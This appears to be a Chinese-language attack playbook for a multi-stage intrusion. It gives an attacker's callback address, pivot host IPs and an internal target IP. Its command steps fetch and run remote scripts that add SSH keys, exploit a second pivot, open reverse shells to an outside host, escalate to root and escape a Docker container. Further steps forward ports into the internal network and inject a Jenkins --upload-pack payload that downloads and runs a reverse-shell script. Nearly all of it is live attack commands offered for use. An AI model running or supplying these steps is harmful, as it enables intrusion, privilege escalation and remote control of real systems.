## 攻击机接受反弹shell的地址
ddns.randomhhh.top:9000  经本地路由器端口转发后的端口为 4444

## 跳板机1 ip
34.92.246.183
## 跳板机2 ip
35.220.174.61

## 目标主机的内网ip
10.170.0.3

# 拿下跳板机1后攻击流程的指令
### 下载addKey.sh 修改权限， 执行，配置主机的ssh公钥，用于ssh登录
```bash
wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/addkey.sh && chmod 755 ./addkey.sh && ./addkey.sh
``` 
### 下载exploitFirst.py 执行，攻击跳板机2
```bash
wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/exploitFirst.py && python exploitFirst.py
```
### webshell内下载reverse1.sh 修改权限，反弹shell到 34.92.246.183:4444
```bash
wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/reverse1.sh 
chmod 755 ./reverse1.sh 
./reverse1.sh
```
### 下载getPty.py ,执行,获取pty
```bash
wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/getPty.py && python getPty.py
```
### 下载upRight.sh, 修改权限，执行，提权至root
```bash
wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/upRight.sh && chmod 755 ./upRight.sh && ./upRight.sh
```
### 下载预先编译的沙箱逃逸二进制，修改权限，执行，在docker外反弹一个shell至 34.92.246.183:4445
```bash
wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/replaceRunc && chmod 755 ./replaceRunc && ./replaceRunc
```
### 分别在跳板机1 和 跳板机2 上开下载和开启端口转发，以访问内网
```bash
# 跳板机1 5555:35.220.174.61:5555
wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/port-forward.py && python ./port-forward.py 5555:35.220.174.61:5555
# 跳板机2 5555:10.170.0.3:80
wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/port-forward.py && python ./port-forward.py 5555:10.170.0.3:80
```

### 最后访问Jenkins漏洞利用的页面，输入下面的payload
```bash
--upload-pack="`wget -O /tmp/reverse2.sh https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/reverse2.sh`"
--upload-pack="`chmod 755 /tmp/reverse2.sh`"
--upload-pack="`/tmp/reverse2.sh `"
```
